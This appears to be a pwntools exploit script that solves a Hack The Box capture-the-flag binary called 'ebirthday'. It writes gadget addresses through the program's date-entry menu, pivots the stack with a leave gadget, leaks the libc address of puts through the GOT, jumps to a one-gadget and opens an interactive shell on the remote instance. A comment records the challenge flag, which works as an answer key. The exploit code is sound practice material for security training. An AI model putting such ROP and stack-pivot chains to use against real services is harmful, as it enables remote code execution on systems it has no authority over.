#exploit for ebirthday
#HTB{U_sH0uLD_NoT_f0rG3t_2_p1V0t}
from pwn import *
import time
elf = ELF("./ebirthday")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('docker.hackthebox.eu',31784)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def create(day,month=0):
	sla(">> ",str(1))
	sla("Type a day number: ",str(day))
	sla("Type a month number: ",str(month))
	
def setuser(payload):
	sla(">> ",str(5))
	sa("username: ",payload)
	target.recvline()

def sa(string,val):
	target.sendafter(string,val)

poprdi=0x0000000000400e23
main=0x400cd0
create(elf.got["strncpy"]+0x20)
create(poprdi)
create(elf.got["puts"])
create(elf.plt["puts"])
create(0x400c36)
leave=0x000000000040092b
payload="/bin/sh\x00"+"A"*0x18+p64(0x602100)+p64(leave)
setuser(payload)
libc_puts=u64(target.recvline().strip("\n").ljust(8,"\x00"))
libc_system=libc_puts-libc.symbols["puts"]+0x4f3c2
payload=p64(libc_system)*2
target.send(payload)
target.interactive()
